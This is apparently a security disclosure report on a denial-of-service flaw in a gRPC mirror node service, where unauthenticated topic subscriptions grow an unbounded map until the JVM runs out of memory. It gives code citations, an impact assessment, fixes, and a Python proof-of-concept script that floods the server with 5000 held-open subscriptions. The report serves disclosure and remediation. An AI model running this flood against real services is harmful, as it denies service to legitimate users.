### Title
Unbounded `topicMessages` ConcurrentHashMap Growth via Unauthenticated gRPC Topic Subscriptions Leading to OOM DoS

### Summary
`RedisTopicListener.getSharedListener()` inserts an entry into the `topicMessages` ConcurrentHashMap for every distinct topic ID subscribed to, with no cap on the map's size. Because the gRPC endpoint requires no authentication and imposes no global limit on total concurrent subscriptions across connections, an attacker can open many connections and subscribe to many distinct topic IDs, growing the map and its associated Redis subscriptions without bound until the JVM runs out of heap memory.

### Finding Description

**Exact code path:**

In `grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java`, `getSharedListener()` at line 61:

```java
return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
```

`topicMessages` is a plain `ConcurrentHashMap` with no size limit. [1](#0-0) [2](#0-1) 

Each call to `subscribe(topic)` creates a new `Flux` backed by a live Redis channel subscription, wrapped with `.share()`. The map entry is only removed via `unsubscribe()` when the shared flux is cancelled (i.e., all subscribers for that topic disconnect): [3](#0-2) [4](#0-3) 

**Root cause — failed assumption:** The design assumes the number of distinct actively-subscribed topic IDs is naturally bounded. There is no enforced cap.

**The `checkTopicExists` guard is insufficient:**

When `checkTopicExists = true` (default), `topicExists()` in `TopicMessageServiceImpl` queries the DB before the listener is invoked. This limits the attack to valid topic IDs. However:

1. `checkTopicExists` is a documented, operator-settable flag. When set to `false` (a supported configuration), any arbitrary numeric topic ID bypasses the DB check entirely, and `getSharedListener` is called for every attacker-supplied ID. [5](#0-4) [6](#0-5) 

2. Even with `checkTopicExists = true`, an attacker who can create topics on the Hedera network (a permissionless operation) can generate arbitrarily many valid topic IDs and subscribe to all of them.

**The per-connection call limit is insufficient:**

`maxConcurrentCallsPerConnection = 5` limits calls per single HTTP/2 connection, but there is no global limit on the total number of connections or total active subscriptions server-wide. [7](#0-6) [8](#0-7) 

An attacker opens C connections × 5 calls each = 5C distinct topic entries in the map simultaneously, each also holding a live Redis pub/sub channel.

### Impact Explanation

Each map entry holds a `Flux` object referencing a live `ReactiveRedisMessageListenerContainer` subscription. With thousands of entries:
- JVM heap is exhausted by the map entries and associated Reactor/Redis objects.
- Redis connection/channel resources are exhausted in parallel.
- The gRPC server crashes with `OutOfMemoryError` or becomes unresponsive, denying service to all legitimate subscribers.

Severity: **High** — complete availability loss of the gRPC mirror node service.

### Likelihood Explanation

- No authentication is required on the gRPC port (port 5600 is publicly exposed per the Helm chart and documentation).
- Opening many TCP/HTTP2 connections is trivial from a single machine or botnet.
- The attack is repeatable and can be sustained indefinitely as long as connections are held open.
- The `checkTopicExists = false` path is a documented, production-relevant configuration option.
- Even under the default configuration, Hedera topic creation is permissionless, so an attacker can pre-create the required topic IDs.

### Recommendation

1. **Cap the map size**: Replace `ConcurrentHashMap` with a bounded cache (e.g., Caffeine `Cache` with a `maximumSize`). When the cap is reached, reject new subscriptions with `RESOURCE_EXHAUSTED`.
2. **Global subscription limit**: Track total active subscriptions server-wide (an `AtomicInteger`) and reject new ones above a configurable threshold.
3. **Per-IP / per-client rate limiting**: Apply a gRPC interceptor that limits the rate of new `subscribeTopic` calls per source IP.
4. **Enforce `checkTopicExists = true`**: Make the default non-overridable or add a warning when disabled, since disabling it removes the only topic-validity gate.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_pb2, consensus_pb2_grpc

TARGET = "mirror-node-grpc:5600"

def subscribe(topic_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_pb2.ConsensusTopicQuery()
    req.topicID.topicNum = topic_id
    # Keep stream open indefinitely
    for _ in stub.subscribeTopic(req):
        pass

threads = []
# Open 1000 connections × 5 calls = 5000 distinct topic entries in topicMessages
for i in range(1, 5001):
    t = threading.Thread(target=subscribe, args=(i,), daemon=True)
    t.start()
    threads.append(t)

# Hold all connections open — topicMessages map now has 5000 entries,
# each backed by a live Redis subscription. Repeat to exhaust heap.
for t in threads:
    t.join()
```

**Preconditions:** Either `checkTopicExists = false` is set, or topic IDs 1–5000 exist in the mirror node DB (achievable by creating topics on the Hedera network). No credentials required.

**Result:** `topicMessages` map grows to 5000+ entries; Redis pub/sub channels accumulate; JVM heap exhaustion causes OOM crash or severe GC pressure, denying service to legitimate users.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java (L33-33)
```java
    private final Map<String, Flux<TopicMessage>> topicMessages; // Topic name to active subscription
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java (L59-62)
```java
    protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
        Topic topic = getTopic(filter);
        return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java (L74-75)
```java
                .doOnCancel(() -> unsubscribe(topic))
                .doOnComplete(() -> unsubscribe(topic))
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java (L82-85)
```java
    private void unsubscribe(Topic topic) {
        topicMessages.remove(topic.getTopic());
        log.info("Unsubscribing from {}", topic);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L94-105)
```java
    private Mono<?> topicExists(TopicMessageFilter filter) {
        var topicId = filter.getTopicId();
        return Mono.justOrEmpty(entityRepository.findById(topicId.getId()))
                .switchIfEmpty(
                        grpcProperties.isCheckTopicExists()
                                ? Mono.error(new EntityNotFoundException(topicId))
                                : Mono.just(Entity.builder()
                                        .memo("")
                                        .type(EntityType.TOPIC)
                                        .build()))
                .filter(e -> e.getType() == EntityType.TOPIC)
                .switchIfEmpty(Mono.error(new IllegalArgumentException("Not a valid topic")));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/GrpcProperties.java (L19-19)
```java
    private boolean checkTopicExists = true;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-34)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
```
